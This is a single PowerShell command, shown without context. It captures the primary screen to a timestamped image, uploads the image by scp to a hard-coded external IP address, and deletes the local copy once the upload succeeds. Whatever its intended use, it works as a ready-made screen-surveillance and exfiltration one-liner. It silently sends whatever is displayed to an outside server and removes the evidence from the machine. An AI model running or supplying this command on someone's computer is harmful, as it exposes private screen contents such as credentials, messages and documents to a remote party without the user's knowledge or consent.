powershell -NoProfile -Command "Add-Type -AssemblyName System.Windows.Forms, System.Drawing; $ts = Get-Date -Format 'yyyy-MM-dd_HH-mm-ss'; $file = \"$env:USERPROFILE\Pictures\screen_$ts.png\"; $b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap($b.Width, $b.Height); $g = [System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($b.Location, [System.Drawing.Point]::Empty, $b.Size); $bmp.Save($file); $g.Dispose(); $bmp.Dispose(); if (Test-Path $file) { scp $file ubuntu@193.123.189.154:/home/ubuntu/.ssh/screenshots/; if ($?) { Remove-Item $file } }"
